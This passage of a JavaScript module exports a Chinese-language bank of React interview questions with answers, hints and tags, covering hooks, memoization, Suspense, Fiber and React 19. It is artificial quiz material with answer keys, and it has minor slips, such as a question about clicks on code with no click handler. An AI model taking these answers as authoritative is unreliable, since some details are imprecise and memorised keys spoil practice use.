export const category = "react";
export const questions = [{"category":"react","difficulty":"easy","type":"short_answer","title":"useState 闭包陷阱（Stale Closure）","content":"以下代码点击三次后输出什么？为什么？\n```jsx\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  useEffect(() => {\n    const timer = setInterval(() => {\n      setCount(count + 1);\n    }, 1000);\n    return () => clearInterval(timer);\n  }, []);\n  return <p>{count}</p>;\n}\n```","answer":"答案：每次只增加到 1，永远不增长\n\n解析：useEffect 回调在 mount 时执行一次，闭包捕获了当时 count = 0。setInterval 中每次执行 setCount(count + 1) 等同于 setCount(0 + 1) = setCount(1)，所以 count 永远是 1。这是 React Hooks 中最常见的闭包陷阱。\n\n扩展延伸：三种解决方案 1）在依赖数组中加 count（但会使定时器重设）2）使用函数式更新 setCount(c => c + 1)（推荐，永远从最新状态计算）3）使用 useRef 保存最新值。函数式更新是最简洁的方案。","hints":["闭包在渲染时捕获了什么","函数式更新 setCount(c => c + 1) 为什么能避免这个问题"],"tags":["React","Hooks","陷阱"],"id":3430},{"category":"react","difficulty":"easy","type":"short_answer","title":"useEffect 依赖项遗漏的问题","content":"useEffect 缺少依赖项时可能引发什么问题？为什么 React 的 eslint-plugin-react-hooks 要求 exhaustive-deps？","answer":"答案：可能读到陈旧的 props/state，产生难以排查的 bug\n\n解析：useEffect 回调形成一个闭包，捕获了创建时的 props 和 state。缺少依赖项意味着即使依赖值变化，effect 也不会重新执行，回调中始终使用旧值。这可能导致数据不同步、无限循环（缺少依赖 + 在 effect 中 setState）或遗漏清理逻辑。\n\n扩展延伸：严格模式下如何思考依赖 1）组件中所有被 effect 引用的 props/state 都应加入依赖 2）如果想故意只在 mount 时执行，需明确说明意图（如 eslint-disable 注释 + 代码注释）3）useEffect 的参数是心智模型的核心——它等价于响应式系统的依赖追踪。","hints":["react-hooks/exhaustive-deps 规则是什么","哪些场景下需要故意跳过依赖"],"tags":["React","Hooks","陷阱"],"id":3431},{"category":"react","difficulty":"easy","type":"short_answer","title":"React key 属性的作用","content":"列表渲染时 key 属性有什么作用？使用数组索引作为 key 有什么风险？","answer":"答案：key 帮助 React 识别哪些元素被修改、添加或删除\n\n解析：React 通过 key 来判断是复用已有 DOM 节点还是创建新节点。使用索引做 key 的问题：在列表插入/删除/排序时，元素下标变化导致 key 改变，React 会错误地复用节点，引发状态错乱（如 input 输入框内容残留）。\n\n扩展延伸：key 的最佳实践 1）优先用数据的唯一 ID（如 id、UUID）2）仅在列表静态不变时用索引 3）key 应在兄弟节点间唯一 4）不推荐用 Math.random() 作为 key（每次渲染都新建 DOM，性能极差）。","hints":["key 变化时 React 做什么","插入新元素时用索引 key 会有什么表现"],"tags":["React","列表","陷阱"],"id":3432},{"category":"react","difficulty":"easy","type":"short_answer","title":"受控组件与非受控组件","content":"请解释 React 中受控组件和非受控组件的区别，各自的适用场景。","answer":"答案：受控组件由 React state 控制表单值，非受控组件由 DOM 自身的 ref 管理状态\n\n解析：受控组件每个输入都对应 state，onChange 更新 state → 组件重渲染 → 显示新值，数据流单向清晰。非受控组件用 ref 从 DOM 获取值，类似传统 HTML 表单，性能更好但难以实时校验。\n\n扩展延伸：如何选择 1）表单校验/联动/条件渲染 → 受控 2）简单的文件上传 → 非受控 3）混合使用（defaultValue + ref）在某些场景下也可行。React 推荐多数场景用受控组件。","hints":["非受控组件如何获取当前值","表单提交时两种方式的处理区别"],"tags":["React","表单"],"id":3433},{"category":"react","difficulty":"easy","type":"short_answer","title":"useCallback/useMemo 的滥用问题","content":"是否所有函数都应该用 useCallback 包裹？什么情况下 useCallback/useMemo 反而会降低性能？","answer":"答案：不是。滥用 useCallback 反而可能降低性能\n\n解析：useCallback/useMemo 本身也有开销——依赖数组的比较 + 闭包维护。如果父组件每次渲染开销本身不大，传一个新函数给子组件也不浪费性能，那么加上 useCallback 增加的代码复杂度和内存开销可能超过减少重渲染带来的收益。\n\n扩展延伸：何时应该使用 1）传给 React.memo 包裹的子组件作为 props 2）作为 useEffect 的依赖项 3）自定义 Hook 返回值中。不使用的场景：原生 DOM 元素、非 memo 的组件、成本极轻的 computed 值。推荐在真正遇到性能问题时再优化，而非提前优化。","hints":["React.memo 和 useCallback 的关系","如何度量子组件重渲染的成本"],"tags":["React","性能","陷阱"],"id":3434},{"category":"react","difficulty":"easy","type":"short_answer","title":"React.memo 的浅比较陷阱","content":"以下代码中 Child 组件被 React.memo 包裹，但父组件每次渲染 Child 仍然重渲染，为什么？\n```jsx\nfunction Parent() {\n  return <Child data={{ name: 'test' }} />;\n}\nconst Child = React.memo(({ data }) => <p>{data.name}</p>);\n```","answer":"答案：对象字面量每次渲染都是新引用，浅比较总是不相等\n\n解析：React.memo 默认使用浅比较（Object.is 比较 props）。{{ name: 'test' }} 每次在父组件 render 时都会创建新对象，引用不同导致浅比较结果为 false，所以 Child 永远重渲染。\n\n扩展延伸：解决方案 1）将对象提升到组件外（const DATA = { name: 'test' }）2）使用 useState/useRef 保持引用稳定 3）使用 useMemo 记忆化对象。React.memo 的心智模型：Props 引用不变才跳过渲染，所以传入内联对象/箭头函数会让 memo 完全失效。","hints":["React.memo 默认比较策略是什么","如何保持 props 引用稳定"],"tags":["React","性能","陷阱"],"id":3435},{"category":"react","difficulty":"easy","type":"short_answer","title":"组件卸载后 setState 的警告","content":"为什么 React 会在组件卸载后的 setState 时抛出警告？如何处理异步操作中的这个问题？","answer":"答案：卸载后 setState 表示内存泄漏——更新已不存在的组件状态\n\n解析：组件卸载后调用 setState，React 会在开发模式下输出警告（Can't perform a React state update on an unmounted component）。这通常是异步回调、定时器或订阅在组件卸载后仍在执行的结果。\n\n扩展延伸：修复方案 1）使用 AbortController 取消 fetch 请求 2）清理定时器/订阅（useEffect 的 cleanup）3）使用 useRef 标记组件是否挂载（如 const mounted = useRef(true) + mounted.current = false 在 cleanup 中，但不推荐作为默认方案）。React 18 的 StrictMode 会在开发环境双重触发 effect 以帮助发现此问题。","hints":["useEffect 的清理函数何时执行","AbortController 如何取消请求"],"tags":["React","Hooks","陷阱"],"id":3436},{"category":"react","difficulty":"easy","type":"short_answer","title":"连续 setState 的批量更新问题","content":"以下代码执行后 count 是多少？\n```jsx\nconst [count, setCount] = useState(0);\nconst handleClick = () => {\n  setCount(count + 1);\n  setCount(count + 1);\n  setCount(count + 1);\n};\n```","answer":"答案：1，不是 3\n\n解析：React 18 中事件处理函数内的 setState 会批量执行（batch update）。三个 setCount(count + 1) 在渲染时 count 都是 0，所以 0 + 1 = 1，最终结果只有 1。这是 React 状态更新机制的核心——state 在单次渲染中保持快照。\n\n扩展延伸：如需基于最新状态多次更新，应使用函数式更新 setCount(c => c + 1) 重复三次，结果才是 3。React 18 之前的版本仅在事件处理函数中批量执行，setTimeout 和 Promise 回调中不会批量。React 18 实现了自动批量更新，所有场景均批量处理。","hints":["函数式更新 setCount(c => c + 1) 和普通更新的区别","React 18 的自动批量更新是什么"],"tags":["React","Hooks","陷阱"],"id":3437},{"category":"react","difficulty":"easy","type":"short_answer","title":"React 合成事件与原生事件混用","content":"在 React 组件中混用 React 合成事件和原生 DOM 事件，可能遇到什么问题？","answer":"答案：执行顺序不可控、事件冒泡/捕获行为异常、内存泄漏\n\n解析：React 合成事件在根节点（React 17 之前为 document，React 17+ 为 root 节点）统一委托处理。原生事件在真实 DOM 上绑定，两者执行时机不同。混用时可能出现：原生事件阻止冒泡后 React 事件无法触发、卸载时未清理原生事件导致内存泄漏、e.stopPropagation() 对原生事件无效。\n\n扩展延伸：最佳实践 1）尽量只用 React 事件系统 2）必须用原生事件时，在 useEffect 的 cleanup 中 removeEventListener 3）useRef 绑定原生事件是合法场景（如 Canvas、第三方库集成）。React 18 改为在 root 节点委托合成事件，使事件行为更贴近原生 DOM。","hints":["React 合成事件在哪里绑定","e.stopPropagation() 在合成事件和原生事件中的区别"],"tags":["React","事件","陷阱"],"id":3438},{"category":"react","difficulty":"easy","type":"short_answer","title":"自定义 Hook 的命名约定与设计","content":"自定义 Hook 为什么必须以 use 开头？不遵守会有什么后果？设计自定义 Hook 的最佳实践有哪些？","answer":"答案：use 前缀是 React 约定的命名规则，ESLint 插件依赖此规则检查 Hook 规则\n\n解析：eslint-plugin-react-hooks 通过函数名是否以 use 开头来判断其是否为 Hook，从而检查 Hooks 的调用规则（不在条件/循环中调用）。不遵守命名约定会失去规则检查，无法发现条件调用 Hook 等错误。\n\n扩展延伸：设计原则 1）单一职责——每个 Hook 管理一个关注点 2）返回值尽量是数组或具名对象 3）依赖参数化——接受外部依赖作为参数 4）组合优于继承——用多个简单 Hook 组合出复杂逻辑 5）避免过度抽象——3 次以上复用才值得抽取。","hints":["ESLint 如何判断一个函数是自定义 Hook","自定义 Hook 的参数和返回值应该如何设计"],"tags":["React","Hooks","规范"],"id":3439},{"category":"react","difficulty":"medium","type":"short_answer","title":"Error Boundary 错误边界","content":"请解释 React Error Boundary 的作用、限制和实现方式。","answer":"答案：Error Boundary 是捕获子组件树中 JavaScript 错误、防止整个应用崩溃并显示降级 UI 的组件。\n\n解析：实现方式：class 组件实现 componentDidCatch(error, info) 和 getDerivedStateFromError(error) 生命周期方法。前者用于日志记录，后者用于更新 state 显示备用 UI。\n\n```jsx\nclass ErrorBoundary extends React.Component {\n  state = { hasError: false };\n  static getDerivedStateFromError() { return { hasError: true }; }\n  componentDidCatch(error, info) { logError(error, info); }\n  render() { return this.state.hasError ? <Fallback /> : this.props.children; }\n}\n```\n\n扩展延伸：重要限制：1）Error Boundary 不能捕获异步错误（useEffect 回调、setTimeout 中的错误）、事件处理中的错误（需用 try-catch）、服务端渲染错误、Error Boundary 自身的错误。2）React 18+ 的 useErrorBoundary（在 use 中处理错误）是一个改进方向。3）推荐粒度：给路由、核心功能块各自包裹 Error Boundary，而非整个应用一个。4）生产环境搭配错误监控服务（Sentry、DataDog RUM）捕获未处理的错误。","hints":["Error Boundary 为什么不能捕获异步错误","事件处理中的错误应该如何处理"],"tags":["React","错误处理"],"id":3440},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 并发特性（Concurrent Features）","content":"请介绍 React 18 引入的并发特性，useTransition、useDeferredValue、Suspense 的作用。","answer":"答案：并发特性（Concurrent Features）让 React 能中断低优先级渲染，优先处理高优先级更新，保持 UI 响应。\n\n解析：1）useTransition——标记低优先级的 state 更新。`const [isPending, startTransition] = useTransition()`。startTransition 内的更新可被更高优先级的更新打断（如输入框输入不卡顿）。典型场景：搜索输入时，输入更新优先，搜索结果渲染可降级。2）useDeferredValue——让某个值延迟更新。当有高优先级更新时，deferred 值保持旧值，等待浏览器空闲再更新。典型场景：大列表过滤时保持输入流畅。3）Suspense——声明式等待异步数据。`<Suspense fallback={<Loading />}><AsyncComponent /></Suspense>`。React 18 的 Streaming SSR 结合 Suspense 实现 HTML 流式输出。\n\n扩展延伸：并发是 React 底层架构能力，不是新 feature。使用并发特性时注意：1）startTransition 不是 setTimeout——它不会延迟执行，而是标记为可中断。2）配合 Suspense 实现「加载-渲染」分离。3）不是所有更新都需要并发——低频率/小更新用普通 setState 即可。4）并发特性在底层使用优先级调度（Lane 模型）决定哪个更新优先处理。","hints":["useTransition 和 setTimeout 的区别","并发模式下 Suspense 的工作原理和传统 try-catch loading 有什么不同"],"tags":["React","并发","React 18"],"id":3441},{"category":"react","difficulty":"medium","type":"short_answer","title":"Refs 与 forwardRef","content":"请解释 React 中 ref 的多种用途，以及 forwardRef 解决了什么问题。","answer":"答案：Ref 提供了一种在 React 声明式体系中逃逸到命令式操作的能力，forwardRef 让父组件能访问子组件的 DOM 节点。\n\n解析：ref 的用途：1）访问 DOM——`ref={el => doSomething(el)}` 或 `useRef(null)` + `ref={myRef}`，用于聚焦输入框/媒体播放/测量尺寸。2）存储可变值——`useRef(initialValue)` 返回的 .current 属性在重新渲染间保持引用不变，修改不会触发重渲染。3）转发 ref——函数组件默认不接收 ref 属性，forwardRef 包裹后可以：\n```jsx\nconst FancyInput = forwardRef((props, ref) => {\n  return <input ref={ref} {...props} />;\n});\n```\n\n扩展延伸：高阶用法：1）useImperativeHandle——配合 forwardRef 限制父组件能调用的方法：`useImperativeHandle(ref, () => ({ focus, validate }), [])`。2）callback ref——当 ref 变化时执行回调：`ref={node => { if (node) measure(node); }}`，比 useRef 更灵活。3）useRef 在并发模式下的注意事项——ref 没有响应式，如果要触发渲染变化应用 state。","hints":["useRef 和 useState 有什么区别","为什么函数组件默认不支持 ref 属性"],"tags":["React","Refs","DOM"],"id":3442},{"category":"react","difficulty":"medium","type":"short_answer","title":"Context 性能问题与优化","content":"使用 React Context 时可能遇到什么性能问题？如何优化？","answer":"答案：Context 的核心问题是：Context 值变化时，所有消费该 Context 的组件都会重新渲染，无论它们实际使用了变化的部分。\n\n解析：问题根源：React Context 使用引用相等性（reference identity）判断是否变化。如果 Context value 是对象字面量（每次渲染创建新对象），所有消费者无条件重渲染。示例：\n```jsx\n<UserProvider>\n  <Avatar />  {/* 只用了 user.avatar */}\n  <Profile />  {/* 只用了 user.name */}\n</UserProvider>\n```\nuser.avatar 变化导致整个 Provider 下的所有消费者重渲染。\n\n扩展延伸：优化策略：1）拆分 Context——将不相关的状态分到不同的 Context Provider（如 ThemeContext、UserContext、ConfigContext），减少不必要消费。2）useMemo 包裹 value——`const value = useMemo(() => ({ user, config }), [user, config])`，避免每次渲染创建新引用。3）用状态管理库替代——Zustand/Jotai 提供更精细的订阅机制，只有实际使用该状态的组件重渲染。4）React 19 的 use()——可能彻底改变 Context 的使用方式。","hints":["拆分 Context 能解决什么性能问题","Zustand 为什么比 Context 性能更好"],"tags":["React","Context","性能"],"id":3443},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Server Components（RSC）","content":"请解释 React Server Components 的概念和解决的问题。Server Component 和 Client Component 如何选择？","answer":"答案：React Server Components（RSC）在服务端渲染且只返回序列化结果（不含 JS bundle），显著减少客户端 JS 体积和数据加载延迟。\n\n解析：RSC 的核心能力：1）零客户端 JS 开销——服务端组件不打包到客户端 bundle，适合纯渲染组件（Markdown 渲染、数据格式化等）。2）直接访问后端资源——直接读取数据库/文件系统，无需额外 API 层。3）自动代码分割——服务端组件和客户端组件的边界即 bundle 分割点。\n\n扩展延伸：Client vs Server 选型决策：1）需要交互（useState/onClick/useEffect）→ Client Component。2）只用 props 渲染数据 → Server Component。3）需要浏览器 API → Client Component。4）需要 SEO → Server Component（SSR 支持）。5）React 19 的 use() 可在服务端组件中 await promise 简化数据获取。6）RSC ≠ SSR——SSR 在服务端渲染 HTML，RSC 返回序列化的组件树（支持流式传输），两者可结合使用。7）Next.js App Router 强制使用 Server Component 默认，需要交互的地方用 'use client' 声明。","hints":["Server Component 和 SSR 有什么本质区别","'use client' 声明对 bundle 体积有什么影响"],"tags":["React","Server Components","架构"],"id":3444},{"category":"react","difficulty":"easy","type":"short_answer","title":"React Portals","content":"请解释 React Portal 的作用和使用场景。Portal 中的事件冒泡行为是什么样的？","answer":"答案：Portal 将子节点渲染到父组件 DOM 树之外的 DOM 节点中，但保持 React 组件树上下文不变。\n\n解析：`ReactDOM.createPortal(children, domNode)` 将 children 渲染到 domNode 元素下（通常在 `document.body` 或独立容器中），而非父组件的 DOM 层级下。典型场景：模态框、工具提示、弹出菜单、通知 toast。\n\n扩展延伸：Portal 的事件冒泡行为——尽管 DOM 位置在父组件之外，但事件冒泡仍然遵循 React 组件树（而非真实 DOM 树）。这意味着父组件能捕获 Portal 内冒泡出来的事件。这一设计让 Portal 的上下文行为保持一致。React 17+ 将 Portal 的合成事件附加到 Portal 容器而非 document，使事件行为更接近直觉。注意：Portal 的样式继承（CSS 继承属性如 font-family）仍然基于真实 DOM 位置，而非组件树——所以可能需要额外重置样式。","hints":["Portal 中事件冒泡遵循 React 组件树还是真实 DOM 树","Portal 在什么场景下比绝对定位更合适"],"tags":["React","Portal"],"id":3445},{"category":"react","difficulty":"easy","type":"short_answer","title":"useReducer vs useState","content":"什么情况下应该使用 useReducer 而不是 useState？两者如何选择？","answer":"答案：useReducer 适合复杂 state 逻辑、state 依赖另一个 state、深层更新场景。useState 适合简单独立的状态值。\n\n解析：useReducer 的优势：1）复杂 state 结构——state 是对象有多个字段（如表单状态含 name/email/errors/isSubmitting）。2）更新逻辑依赖当前 state——Reducer 接收 prevState，没有闭包陷阱。3）更新逻辑可复用——Reducer 是纯函数，可单独测试，可在多个组件间共享。4）性能优化——dispatch 引用稳定，传给子组件不会引起不必要重渲染（与 useCallback 配合更佳）。\n\n扩展延伸：对比清单：用 useState 的场景——简单的 toggle、单个数字/字符串、更新逻辑简单。用 useReducer 的场景——多字段表单、购物车操作（增删改查）、undo/redo 历史记录。自定义 Hook 封装 + useState 可以达到类似 useReducer 的效果。Immer 配合 useReducer（useImmerReducer）可以让复杂 state 更新更简洁。","hints":["useReducer 的 dispatch 为什么不需要加 useCallback","useReducer 和 useState 在性能优化上的区别"],"tags":["React","Hooks","状态管理"],"id":3446},{"category":"react","difficulty":"easy","type":"short_answer","title":"高阶组件（HOC）模式","content":"请解释高阶组件（Higher-Order Component）的概念、用途和局限性。","answer":"答案：高阶组件是接收一个组件并返回一个新组件的函数。它是一种复用组件逻辑的模式，在 React Hooks 流行之前广泛使用。\n\n解析：本质：`const EnhancedComponent = higherOrderComponent(WrappedComponent)`。典型用途：1）权限控制——检查用户权限后决定是否渲染子组件。2）数据获取——在 HOC 中获取数据，将数据通过 props 注入子组件。3）日志/埋点——自动在组件挂载时发送日志。4）Redux 的 connect——`connect(mapStateToProps, mapDispatchToProps)(Component)` 是最经典的 HOC 例子。\n\n扩展延伸：HOC 的局限性：1）Props 命名冲突——HOC 注入的 props 可能与子组件已有的 props 重名。2）静态方法丢失——HOC 不自动传递子组件的静态方法，需手动 hoist-non-react-statics。3）ref 不穿透——ref 默认指向 HOC 外层容器而非子组件，需 React.forwardRef 解决。4）多层嵌套地狱——多个 HOC 叠加使调试困难（wrapper hell）。HOC vs Hooks：Hooks 解决了 HOC 的大部分痛点（无命名冲突、无静态方法丢失、无嵌套），是 HOC 的主流替代方案。选择原则：新代码优先用 Hooks，遗留代码维护时理解 HOC 模式即可。","hints":["HOC 和 Render Props 模式有什么区别","为什么 Hooks 能替代 HOC"],"tags":["React","HOC","模式"],"id":3447},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Testing Library 测试策略","content":"如何使用 React Testing Library 测试组件？测试组件的最佳实践是什么？","answer":"答案：React Testing Library 以用户视角测试组件——关注渲染输出和交互行为，不测试实现细节。\n\n解析：核心原则：测试用户能看到什么、能操作什么，而非组件内部 state、生命周期方法或 Hook 调用。常用 API：`render(<Component />)`（渲染组件）、`screen.getByText/ByRole/ByTestId`（查询元素，优先 ByRole 语义化查询）、`fireEvent.click()` 或 `userEvent.click()`（模拟用户交互，userEvent 更接近真实行为）。\n\n```jsx\nimport { render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\n\ntest('shows greeting after name input', async () => {\n  render(<Greeting />);\n  await userEvent.type(screen.getByLabelText('Name'), 'Alice');\n  expect(screen.getByText('Hello, Alice!')).toBeInTheDocument();\n});\n```\n\n扩展延伸：最佳实践：1）查询优先级：getByRole > getByLabelText > getByPlaceholderText > getByText > getByTestId（`data-testid` 是最后的手段）。2）测试行为而非实现——不要测 state 值，测页面渲染了正确的内容。3）用 `waitFor` 和 `findBy` 处理异步渲染。4）用 MSW（Mock Service Worker）模拟 API 调用，不 mock fetch/axios。5）覆盖有价值的场景——Happy path（正常流程）、Error state（错误处理）、Edge case（空数据、边界值）。6）避免测试过于碎片化——测试组件在用户视角下的行为，而非逐个方法测试。","hints":["Testing Library 查询元素的优先级顺序","React Testing Library 和 Enzyme 的核心差异是什么"],"tags":["React","测试"],"id":3448},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Suspense 与数据获取模式","content":"请介绍 React Suspense 在数据获取场景下的使用方式和最佳实践。","answer":"答案：Suspense 是一种声明式的加载状态处理机制，组件可以「等待」异步操作，同时显示 fallback 内容。\n\n解析：传统模式：组件内用 useEffect 获取数据，手动管理 loading/error/success 三种状态。Suspense 模式：异步操作在组件外或渲染过程中触发，Suspense 边界自动捕获未完成的异步依赖并显示 fallback。\n\n```jsx\n<Suspense fallback={<Loading />}>\n  <UserProfile userId={id} />\n</Suspense>\n```\n\n用户 profile 数据未加载完时显示 Loading，加载完成后显示 UserProfile。错误边界通过 Error Boundary 统一处理——`<ErrorBoundary fallback={<ErrorPage />}><Suspense><UserProfile /></Suspense></ErrorBoundary>`。\n\n扩展延伸：React 19 的 `use()` Hook 是 Suspense 数据获取的重要简化：`const data = use(fetchDataPromise)`，可在组件渲染过程中直接读取 Promise，Suspense 会自动处理挂起状态。流式 SSR（Streaming SSR）结合 Suspense 实现 HTML 流式输出——每个 Suspense 边界独立流式传输，用户无需等待整个页面加载完成即可看到已渲染部分。最佳实践：1）合理划分 Suspense 边界——太粗导致大块区域 loading，太细导致布局反复跳变。2）配合 useDeferredValue 让旧数据保持可见直到新数据就绪。3）并发模式下 Suspense 的嵌套 loading 会以「揭示」模式（reveal sequence）自动处理——嵌套的 Suspense 边界同时显示。","hints":["use() Hook 和传统 useEffect + useState 的数据获取有什么区别","流式 SSR 如何改善用户体验"],"tags":["React","Suspense","数据获取","React 19"],"id":3449},{"category":"react","difficulty":"hard","type":"short_answer","title":"React Fiber 架构与协调原理","content":"请解释 React Fiber 架构的核心设计。Fiber 节点如何实现可中断的渲染？workInProgress 树和 Effect List 的作用是什么？","answer":"答案：React Fiber 是 React 16 引入的新协调（Reconciliation）引擎，将渲染拆分为可中断的单元（Fiber 节点），实现了优先级调度和并发能力。\n\n解析：Fiber 架构的核心设计：1）Fiber 节点——每个 React 元素对应一个 Fiber 节点，包含 type（组件类型）、key、stateNode（DOM 节点/组件实例）、child/sibling/return（构成 Fiber 树的三级指针：子节点→兄弟节点→父节点）。Fiber 树本质上是一个链表结构（不是递归树），这使得遍历可以随时暂停和恢复。2）双缓冲——current 树（当前屏幕上显示的 UI）和 workInProgress 树（正在构建的下一版本）。每次状态更新时，React 在 workInProgress 树上执行协调，完成后将 workInProgress 切为 current（root.current = workInProgress）。3）Effect List——遍历 workInProgress 树时，将有副作用的 Fiber 节点串成链表（effect list），提交阶段一次性处理。副作用包括 DOM 插入/更新/删除、useEffect 回调等。4）时间切片（Time Slicing）——React 利用 requestIdleCallback（或 polyfill）将 workInProgress 树的构建拆分为多个小任务单元（yield 回主线程处理高优先级输入如用户点击）。\n\n扩展延伸：Fiber 的协调流程分为两个阶段：1）Render Phase（可中断）——构建 workInProgress 树，执行 diff 算法（beginWork → completeWork），标记需要更新的节点（effectTag），此阶段可被高优先级任务打断。2）Commit Phase（不可中断，同步执行）——将 Effect List 提交到 DOM（before mutation → mutation → layout），执行生命周期方法和 effect 回调。因为此阶段操作 DOM，中断会导致 UI 不一致，所以必须同步完成。Fiber 解决了 React 15（Stack Reconciler）的问题：递归遍历虚拟 DOM 树不可中断，导致复杂组件渲染时阻塞主线程造成卡顿。","hints":["Fiber 树的链表结构为什么比递归遍历更适合并发渲染","Render Phase 和 Commit Phase 为什么一个可中断一个不可中断"],"tags":["React","Fiber","架构","协调"],"id":3450},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 19 新特性概览","content":"请介绍 React 19 的主要新特性，尤其是 Actions、use() Hook、Server Components 稳定化方面的变化。","answer":"答案：React 19（2024 年底发布）带来了多个重要新特性：Actions（基于 Server Actions 的表单处理）、use()（在渲染中直接读取 Promise/Context）、Server Components 正式稳定化。\n\n解析：1）Actions——`<form action={actionFunction}>` 直接在表单上使用异步函数处理提交。`useActionState`（原 `useFormState`）获取表单状态和提交状态。`useFormStatus` 在子组件中读取父表单的提交状态。Actions 与 Server Actions（'use server'）结合可直接在后端处理表单，无需手动写 API 路由。\n\n2）`use()`——React 19 的新 Hook，可在渲染期间直接读取 Promise 或 Context。示例：`const data = use(fetchDataPromise)`。与 Suspense 无缝集成——promise 未 resolved 时自动挂起组件，Suspense 边界显示 fallback。不同于 useEffect + useState（需要手动管理 loading 状态），`use()` 简化了异步数据获取。注意：`use()` 可根据条件调用（不同于其他 Hooks 不可在条件中调用）。\n\n3）Server Components——正式稳定，Next.js App Router 已使用。服务端组件默认不包含在客户端 JS bundle 中，可直接读取数据库/文件系统，减少客户端 JS 体积。'use client' 声明客户端边界。\n\n扩展延伸：React 19 的其他改进：ref 作为 prop 不再需要 forwardRef（ref 直接被识别为 prop），useMemo/useCallback 返回值更智能的优化（React 可能忽略不必要的记忆化），自定义元素（Custom Elements）的原生支持，资源预加载（preload/preinit）的声明式 API。升级建议：项目升级 React 19 时需更新 React Router（v7+）、Ant Design（v5.22+）等依赖库的兼容版本。","hints":["use() 和传统 useEffect + useState 数据获取在代码量上的对比","React 19 移除 forwardRef 对迁移的影响"],"tags":["React","React 19","新特性"],"id":3451},{"category":"react","difficulty":"hard","type":"short_answer","title":"CSS-in-JS 方案对比与选择","content":"请对比 React 中主流的 CSS 方案：styled-components、CSS Modules、Tailwind CSS、Vanilla Extract。各自的优劣和适用场景是什么？","answer":"答案：四种方案代表了不同的 CSS 组织哲学：styled-components（运行时 CSS-in-JS）、CSS Modules（编译时模块化）、Tailwind CSS（原子化 CSS）、Vanilla Extract（零运行时 CSS-in-JS）。\n\n解析：1）styled-components——在 JS 中写 CSS，通过 tagged template literals 定义组件样式。优点：组件内聚、动态样式（props 驱动）、无 class 命名冲突。缺点：运行时开销（解析模板 → 注入 style 标签）、bundle 体积大（含 css-to-js 解析器）。适用场景：中小型项目、动态样式多。\n\n2）CSS Modules——`import styles from './Component.module.css'`，编译时 class 名加 hash 避免冲突。优点：零运行时开销、原生 CSS 语法、Webpack/Vite 内置支持。缺点：动态样式需要内联 style 或 CSS 变量、全局样式需要 `:global`。适用场景：对性能敏感的项目。\n\n3）Tailwind CSS——预定义的原子化 class（`flex`, `text-center`, `p-4`）。优点：设计一致（设计系统约束）、构建产物极小（purgeCSS 只保留用到的类）、无需命名 class、响应式便捷（`md:flex`）。缺点：模板中 class 冗长、学习曲线（需记 class 名）、提取组件时需要封装抽象。适用场景：UI 一致性要求高的中大型项目、快速原型。\n\n4）Vanilla Extract——编译时 CSS-in-JS（TypeScript 中定义样式，编译为纯 CSS 文件）。优点：零运行时、完整 TypeScript 类型安全（自动补全、编译时验证）、主题系统完善。缺点：学习成本、生态不如其他方案成熟。适用场景：TypeScript 重度用户、对类型安全有高要求。\n\n扩展延伸：选择建议：1）新项目优先 Tailwind CSS（生态好、社区活跃、开发效率高）。2）传统服务端渲染项目用 CSS Modules（零成本、SSR 友好）。3）需要复杂动态样式时用 Vanilla Extract 或 Linaria（零运行时 CSS-in-JS 方向）。4）React Native 项目用 StyleSheet API 或 NativeWind（Tailwind for RN）。趋势：运行时 CSS-in-JS（styled-components）在 React 19 中面临服务器组件兼容性问题，社区正转向零运行时方案。","hints":["Tailwind CSS 的 purgeCSS 如何做到极小生产包体积","运行时 CSS-in-JS 在 React Server Components 中有什么兼容问题"],"tags":["React","CSS","样式","选型"],"id":3452},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 与 TypeScript 类型最佳实践","content":"在 React + TypeScript 项目中，如何定义组件的 Props 类型？有哪些常见的类型模式和技巧？","answer":"答案：React + TypeScript 的类型定义核心是 Props 类型化、事件处理类型化、泛型组件。\n\n解析：1）Props 类型定义——接口（interface，优先用 interface，可合并声明）或类型别名（type，需要联合/交叉类型时用）。\n\n```tsx\ninterface ButtonProps {\n  variant: 'primary' | 'secondary';\n  size?: 'sm' | 'md' | 'lg';\n  children: React.ReactNode;\n  onClick?: React.MouseEventHandler<HTMLButtonElement>;\n}\n```\n\n2）常用的 React 类型：`React.FC<Props>`（默认有 children —— React 18 移除了隐式 children，显式声明更好）、`React.ReactNode`（任意可渲染内容）、`React.CSSProperties`（style prop）、`React.ComponentProps<'button'>`（获取原生 button 的 props 类型，方便包装组件）。\n\n3）泛型组件——组件 Props 中包含泛型参数：\n\n```tsx\ninterface ListProps<T> {\n  items: T[];\n  renderItem: (item: T) => React.ReactNode;\n}\nfunction List<T>({ items, renderItem }: ListProps<T>) {\n  return <>{items.map(renderItem)}</>;\n}\n// 使用：<List items={[{ id: 1, name: 'a' }]} renderItem={(item) => <p>{item.name}</p>} />\n// item 类型自动推断为 { id: number; name: string }\n```\n\n4）事件处理——`onChange: (e: React.ChangeEvent<HTMLInputElement>) => void`、`onSubmit: (e: React.FormEvent<HTMLFormElement>) => void`。\n\n扩展延伸：进阶技巧：1）Props 提取——`type ComposedProps = React.ComponentProps<typeof Composed>` 获取已有组件的 Props 类型。2）Omit 联合类型扩展——`interface MyButtonProps extends Omit<React.ComponentProps<'button'>, 'type'> { type: 'submit' | 'reset' }`（覆盖原生 type 属性）。3）as 多态组件（Polymorphic Component）——`ComponentPropsWithRef<'as'>` 泛型参数。4）条件类型映射——`type EventHandler<T> = T extends 'click' ? React.MouseEvent : T extends 'change' ? React.ChangeEvent : never`。生产建议：不要过度追求类型体操，类型安全的目标是在「不给开发者增加认知负担」的前提下「让非法状态不可表示」。","hints":["React.FC<Props> 在 React 18 中 children 不再隐式包含的原因","泛型组件中类型参数自动推断的原理"],"tags":["React","TypeScript","类型"],"id":3453},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 状态管理库选型：Redux vs Zustand vs Jotai","content":"请对比 Redux Toolkit、Zustand、Jotai 三种状态管理方案的设计哲学和适用场景。","answer":"答案：Redux Toolkit 是集中式 Flux 架构，Zustand 是简约的集中式 Store，Jotai 是基于原子（Atom）的分散式状态管理。三者代表了不同的状态管理哲学。\n\n解析：1）Redux Toolkit（RTK）——集中式单一 Store，通过 Slice 切分状态和 reducer。使用 Immer 简化不可变更新（`state.counter.value += 1`）。RTK Query 处理 API 